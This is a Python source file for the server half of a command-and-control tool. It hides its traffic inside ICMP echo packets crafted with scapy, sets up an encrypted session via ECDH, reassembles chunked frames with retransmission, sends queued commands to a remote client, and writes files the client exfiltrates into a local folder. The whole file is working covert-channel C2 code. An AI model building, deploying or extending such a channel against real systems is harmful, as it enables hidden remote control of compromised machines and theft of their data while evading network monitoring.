#!/usr/bin/env python3

# *********************************************************
#
# Description: Server engine managing C2 network transactions and ARQ states.
# Author: Moshe Yifrah
#
# *********************************************************

# --- Modules ---

from __future__ import annotations

import argparse
import asyncio
import os
import sys
from typing import Final, Optional, Tuple
import scapy.all as scapy

from common import cnc_core, cnc_crypto

# --- Constants & State ---

OUTPUT_DIR: Final[str] = os.path.join(os.path.dirname(os.path.abspath(__file__)), "received_files")
FILE_MODE_PERM: Final[int] = 0o600
DIR_MODE_PERM: Final[int] = 0o700
DISPATCHER_SLEEP_INTERVAL: Final[float] = 0.05

# ==============================================================================

# --- Classes ---

class ServerSession:
    """Manages per-connection state: queues, RX buffer, sockets, crypto."""

    def __init__(
        self, args: argparse.Namespace, identity_priv_hex: str
    ) -> None:
        """Initialize session state, queues, and the L3 send socket."""
        self.args = args
        self.identity_priv_hex = identity_priv_hex
        self.inbound_queue: asyncio.Queue[Tuple[int, bytes]] = asyncio.Queue()
        self.outbound_queue: asyncio.Queue[Tuple[bytes, int]] = asyncio.Queue()
        self.ack_queue: asyncio.Queue[Tuple[int, int]] = asyncio.Queue()
        self.shutdown_event = asyncio.Event()
        self.tx_lock = asyncio.Lock()
        self.l3_socket = scapy.conf.L3socket(iface=args.interface)
        self.rx_buffer = bytearray()
        self.active_rx_transfer_id: Optional[int] = None
        self.expected_rx_seq: int = 1
        self.last_completed_transfer_id: Optional[int] = None
        self.is_waiting_for_ack: bool = False
        self._last_client_eph_pub: Optional[bytes] = None
        self._last_hs_resp_frame: Optional[bytes] = None
        self._last_client_icmp_id: int = 0
        self._last_client_icmp_seq: int = 0

    # ==========================================================================

    def close(self) -> None:
        """Zeroize the session key and close the L3 socket."""
        cnc_crypto.destroy_session_crypto()
        try:
            self.l3_socket.close()
        except OSError:
            pass

    # ==========================================================================

    def _send_raw_packet(self, payload_bytes: bytes) -> None:
        """Build an ICMP echo-reply packet and transmit it to the client."""
        pkt = cnc_core.build_icmp_packet(
            self.args.destination_ip,
            cnc_core.ICMP_ECHO_REPLY_TYPE,
            payload_bytes,
            icmp_id=self._last_client_icmp_id,
            icmp_seq=self._last_client_icmp_seq,
        )
        self.l3_socket.send(pkt)

    # ==========================================================================

    def _reset_rx_state(self) -> None:
        """Clear inbound reassembly state for a fresh transfer."""
        self.rx_buffer.clear()
        self.active_rx_transfer_id = None
        self.expected_rx_seq = 1
        self.last_completed_transfer_id = None

    # ==========================================================================

    def send_control_reset(self) -> None:
        """Reset RX state and send a RESET control frame to the client."""
        self._reset_rx_state()
        self._send_raw_packet(
            cnc_core.encode_control_frame(cnc_core.OPCODE_RESET)
        )

    # ==========================================================================

    def send_shutdown_handshake(self) -> None:
        """Destroy the session key and send a SHUTDOWN frame to the client."""
        shutdown_frame = cnc_core.encode_control_frame(cnc_core.OPCODE_SHUTDOWN)
        cnc_crypto.destroy_session_crypto()
        self._last_client_eph_pub = None
        self._last_hs_resp_frame = None
        self._send_raw_packet(shutdown_frame)

    # ==========================================================================

    def send_ack(self, transfer_id: int, seq_id: int) -> None:
        """ACK the given transfer and seq IDs with an empty frame."""
        self._send_raw_packet(
            cnc_core.encode_control_frame(
                cnc_core.OPCODE_ACK, transfer_id, seq_id
            )
        )

    # ==========================================================================

    async def _tx_arq_retry_loop(
        self, frame: bytes, transfer_id: int, seq_id: int
    ) -> bool:
        """ARQ-retry one frame; return True on ACK, False on timeout."""
        loop = asyncio.get_running_loop()
        retry_count = 0
        while retry_count < cnc_core.MAX_RETRANSMIT_ATTEMPTS:
            while not self.ack_queue.empty():
                self.ack_queue.get_nowait()
            cnc_core.start_rtt_timer(is_retransmit=(retry_count > 0))
            self.is_waiting_for_ack = True
            await loop.run_in_executor(None, self._send_raw_packet, frame)
            timeout = cnc_core.get_adaptive_timeout(retry_count)
            try:
                ack_tid, ack_seq = await asyncio.wait_for(
                    self.ack_queue.get(), timeout=timeout
                )
                if ack_tid == transfer_id and ack_seq == seq_id:
                    return True
            except asyncio.TimeoutError:
                retry_count += 1
                print(
                    f"[Server Warning] Block {seq_id} ACK timeout "
                    f"({timeout:.3f}s). Retry {retry_count}/"
                    f"{cnc_core.MAX_RETRANSMIT_ATTEMPTS}",
                    file=sys.stderr,
                )
        return False

    # ==========================================================================

    async def send_response_chunks_reliably(
        self, raw_bytes_payload: bytes, app_opcode: int
    ) -> None:
        """Chunk and deliver each response frame with ARQ guarantees."""
        loop = asyncio.get_running_loop()
        transfer_id, frames = cnc_core.prepare_transfer_frames(
            raw_bytes_payload, cnc_core.OPCODE_RES, app_opcode
        )
        total = len(frames)
        verbose = app_opcode != cnc_core.CMD_KEEPALIVE
        if verbose:
            print(
                f"[TX → CLIENT] tid={transfer_id:#010x}  {total} chunk(s)",
                file=sys.stderr,
            )
        async with self.tx_lock:
            for frame_bytes, seq_id in frames:
                if verbose:
                    print(
                        f"[TX → CLIENT] sending chunk {seq_id}/{total}  seq={seq_id}",
                        file=sys.stderr,
                    )
                success = await self._tx_arq_retry_loop(
                    frame_bytes, transfer_id, seq_id
                )
                self.is_waiting_for_ack = False
                if verbose and success:
                    print(
                        f"[TX → CLIENT] chunk {seq_id}/{total}  ACK'd",
                        file=sys.stderr,
                    )
                if not success:
                    print(
                        "[Server Error] Link timeout. Sending reset.",
                        file=sys.stderr,
                    )
                    await loop.run_in_executor(None, self.send_control_reset)
                    return

    # ==========================================================================

    def process_incoming_frame(
        self, packet: scapy.Packet, event_loop: asyncio.AbstractEventLoop
    ) -> None:
        """Filter and HMAC-verify a sniffer packet, then dispatch it."""
        if not cnc_core.is_valid_icmp_packet(packet):
            return
        if (
            packet[scapy.IP].src != self.args.destination_ip
            or packet[scapy.ICMP].type != cnc_core.ICMP_ECHO_REQUEST_TYPE
        ):
            return
        parsed = cnc_core.decode_and_verify_frame(
            packet[scapy.Raw].load, cnc_core.get_psk()
        )
        if parsed is None:
            parsed = cnc_core.decode_and_verify_frame(
                packet[scapy.Raw].load, cnc_crypto.get_handshake_psk()
            )
            if parsed is None:
                return

        net_op, app_op, flags, tid, seq, chunk_data = parsed
        icmp_id = packet[scapy.ICMP].id
        icmp_seq = packet[scapy.ICMP].seq
        event_loop.call_soon_threadsafe(
            self._handle_verified_frame_on_loop,
            net_op, app_op, flags, tid, seq, chunk_data, icmp_id, icmp_seq,
        )

    # ==========================================================================

    def _handle_inbound_handshake(
        self, chunk_data: bytes, transfer_id: int, seq_id: int
    ) -> None:
        """Perform server-side ECDH from an HS_INIT frame."""
        # Wipe any stale session key before deriving a new one to
        # prevent key reuse.
        cnc_crypto.destroy_session_crypto()
        client_eph_pub = chunk_data[8:]
        srv_eph_priv, srv_eph_pub_bytes = (
            cnc_crypto.generate_ephemeral_keypair()
        )
        signature = cnc_crypto.sign_ephemeral_key(
            self.identity_priv_hex, srv_eph_pub_bytes
        )
        resp_payload = b"HS_RESP:" + srv_eph_pub_bytes + signature
        frame = cnc_core.encode_frame(
            resp_payload, cnc_core.OPCODE_RESET,
            cnc_core.CMD_KEEPALIVE,
            transfer_id, seq_id, True, cnc_core.get_psk(),
        )
        self._last_client_eph_pub = client_eph_pub
        self._last_hs_resp_frame = frame
        self._send_raw_packet(frame)
        cnc_crypto.derive_and_set_session_key(srv_eph_priv, client_eph_pub)
        del srv_eph_priv
        self._reset_rx_state()
        while not self.outbound_queue.empty():
            try:
                self.outbound_queue.get_nowait()
            except asyncio.QueueEmpty:
                break
        print(
            "\n[+] Handshake complete! Ephemeral session key derived.",
            file=sys.stderr,
        )

    # ==========================================================================

    def _handle_verified_frame_on_loop(
        self,
        net_opcode: int,
        app_opcode: int,
        flags: int,
        transfer_id: int,
        seq_id: int,
        chunk_data: bytes,
        icmp_id: int = 0,
        icmp_seq: int = 0,
    ) -> None:
        """Route a verified frame to the RESET, ACK, or CMD handler."""
        self._last_client_icmp_id = icmp_id
        self._last_client_icmp_seq = icmp_seq
        if net_opcode == cnc_core.OPCODE_RESET:
            if chunk_data.startswith(b"HS_INIT:") and len(chunk_data) == 40:
                client_eph_pub = chunk_data[8:]
                if client_eph_pub == self._last_client_eph_pub:
                    if self._last_hs_resp_frame is not None:
                        self._send_raw_packet(self._last_hs_resp_frame)
                else:
                    self._handle_inbound_handshake(chunk_data, transfer_id, seq_id)
            else:
                self._reset_rx_state()
            return
        elif net_opcode == cnc_core.OPCODE_ACK:
            self._handle_inbound_ack_state(transfer_id, seq_id)
            return
        elif net_opcode == cnc_core.OPCODE_CMD:
            self._handle_inbound_cmd_state(
                app_opcode, flags, transfer_id, seq_id, chunk_data
            )
            return

    # ==========================================================================

    def _handle_inbound_ack_state(
        self, transfer_id: int, seq_id: int
    ) -> None:
        """Enqueue an inbound ACK so the ARQ retry loop can unblock."""
        cnc_core.update_rtt_measurement()
        self.ack_queue.put_nowait((transfer_id, seq_id))

    # ==========================================================================

    def _handle_inbound_cmd_state(
        self, app_op: int, flags: int, tid: int, seq: int, chunk: bytes
    ) -> None:
        """Reassemble CMD chunks, ACK each, and enqueue payload on EOF."""
        if tid == self.last_completed_transfer_id:
            self.send_ack(tid, seq)
            return
        if self.active_rx_transfer_id != tid:
            if seq != 1:
                return
            self.active_rx_transfer_id = tid
            self.expected_rx_seq = 1
            self.rx_buffer.clear()
        if seq < self.expected_rx_seq:
            self.send_ack(tid, seq)
            return
        if seq == self.expected_rx_seq:
            if len(self.rx_buffer) + len(chunk) > cnc_core.MAX_BUFFER_LIMIT:
                self.send_control_reset()
                return
            self.rx_buffer.extend(chunk)
            self.expected_rx_seq += 1
            self.send_ack(tid, seq)
            if flags & cnc_core.FLAG_EOF:
                payload = bytes(self.rx_buffer)
                self.rx_buffer.clear()
                self.last_completed_transfer_id = tid
                self.active_rx_transfer_id = None
                self.expected_rx_seq = 1
                self.inbound_queue.put_nowait((app_op, payload))

# ==============================================================================

# --- Functions ---

def _parse_file_transfer_payload(
    file_data_bytes: bytes,
) -> Optional[Tuple[str, bytes]]:
    """Extract and validate the filename and content from a transfer payload."""
    if b"\n---\n" not in file_data_bytes:
        return None
    header_part, file_content = file_data_bytes.split(b"\n---\n", 1)
    raw_name = header_part.decode("utf-8", errors="replace").strip()
    filename = os.path.basename(raw_name)
    if not filename or filename in {".", ".."} or "\x00" in filename:
        return None
    return filename, file_content

# ==============================================================================

def _resolve_safe_output_path(filename: str) -> Optional[str]:
    """Resolve a filename to a safe absolute path within OUTPUT_DIR."""
    os.makedirs(OUTPUT_DIR, mode=DIR_MODE_PERM, exist_ok=True)
    real_base = os.path.realpath(OUTPUT_DIR)
    candidate = os.path.realpath(os.path.join(real_base, filename))
    if os.path.commonpath([real_base, candidate]) != real_base:
        return None
    return candidate

# ==============================================================================

def save_received_file_safely(file_data_bytes: bytes) -> str:
    """Parse, validate, and write an inbound file to received_files/."""
    parsed = _parse_file_transfer_payload(file_data_bytes)
    if parsed is None:
        return "ERROR: Invalid or unsafe file transfer payload."
    filename, file_content = parsed
    safe_path = _resolve_safe_output_path(filename)
    if safe_path is None:
        return "ERROR: Path traversal attempt blocked."
    open_flags = (
        os.O_WRONLY | os.O_CREAT | os.O_TRUNC
        | getattr(os, "O_NOFOLLOW", 0)
    )
    fd = os.open(safe_path, open_flags, FILE_MODE_PERM)
    with os.fdopen(fd, "wb") as file_writer:
        file_writer.write(file_content)
    return f"SUCCESS: Saved {len(file_content)} bytes to {safe_path}"

# ==============================================================================

async def _handle_client_response(
    loop: asyncio.AbstractEventLoop,
    session: ServerSession,
    app_opcode: int,
    client_bytes: bytes,
) -> None:
    """Display the client's response or save it as a file."""
    if client_bytes.startswith(b"[File Content Outbox]"):
        status = await loop.run_in_executor(
            None, save_received_file_safely, client_bytes
        )
        print(f"\n[+] File Transfer Status: {status}", file=sys.stderr)
    elif app_opcode != cnc_core.CMD_KEEPALIVE:
        print(
            f"\n[+] Client Response: "
            f"{client_bytes.decode('utf-8', errors='replace')}",
            file=sys.stderr,
        )

# ==============================================================================

async def _send_next_command(session: ServerSession) -> None:
    """Send the next queued command if one is pending; do nothing otherwise."""
    if not session.outbound_queue.empty():
        next_cmd, next_op = await session.outbound_queue.get()
        await session.send_response_chunks_reliably(next_cmd, next_op)
        session.outbound_queue.task_done()

# ==============================================================================

async def reactive_network_dispatcher(session: ServerSession) -> None:
    """Dequeue client messages, print results, and send next command."""
    loop = asyncio.get_running_loop()
    await asyncio.sleep(DISPATCHER_SLEEP_INTERVAL)
    while not session.shutdown_event.is_set():
        try:
            app_opcode, client_bytes = await asyncio.wait_for(
                session.inbound_queue.get(),
                timeout=cnc_core.DISPATCHER_TIMEOUT,
            )
            await _handle_client_response(
                loop, session, app_opcode, client_bytes
            )
            session.inbound_queue.task_done()
            await _send_next_command(session)
        except asyncio.TimeoutError:
            continue
